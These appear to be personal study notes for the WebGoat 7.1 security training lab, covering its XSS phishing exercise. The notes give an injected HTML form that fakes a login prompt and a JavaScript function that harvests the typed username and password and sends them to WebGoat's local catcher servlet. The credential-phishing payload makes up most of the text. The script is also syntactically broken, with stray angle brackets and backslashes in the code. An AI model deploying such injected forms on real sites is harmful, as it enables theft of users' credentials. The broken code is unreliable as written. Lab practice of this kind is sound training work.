### Launch webgoat:
```shell
cd ~/Downloads/
java -jar webgoat-container-7.1-exec.jar
```

### Watch the pretty terminal output. Then point your browser to:

[http://localhost:8080/WebGoat][1]

[1]:http://localhost:8080/WebGoat

# Webgoat XSS Notes
Inject HTML and JS to phish user credentials.

First inject the HTML into the Search input field to create a form just below it:

```html
<form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
  ```
Add a button that can POST a request:
```html
<input type="submit" name="login" value="login">
```
The HTML for the `submit` button has to go in the HTML before the closing `</form>` tag.
Also, you have to put an `onclick` handler before closing this last `input` tag.

```html
onclick="hack()"
```
So now the last `input` tag looks like this:

```html
<input type="submit" name="login" value="login" onclick="hack()">
```

At this point the injected HTML form looks like this:

```html
<form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

But of course this means that you have to create a Javascript function called `hack()`. This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet, which is running locally.

```javascript
<script>
function hack(){
  // Instantiate a new DOM image element which we'll use for...
  XSSImage=new Image; XSSImage.src="<http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + \
  document.phish.user.value> + "&password=" + document.phish.pass.value + "";
  // Pop up an alert() to display the victim's username and password.
  alert("Had this been a real attack... Your credentials were just stolen. \
  User Name = " + document.phish.user.value + " Password = " + \
  document.phish.pass.value);
  }
</script>
```

And post it to the local capture page:
```
http://localhost:8080/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE
```  
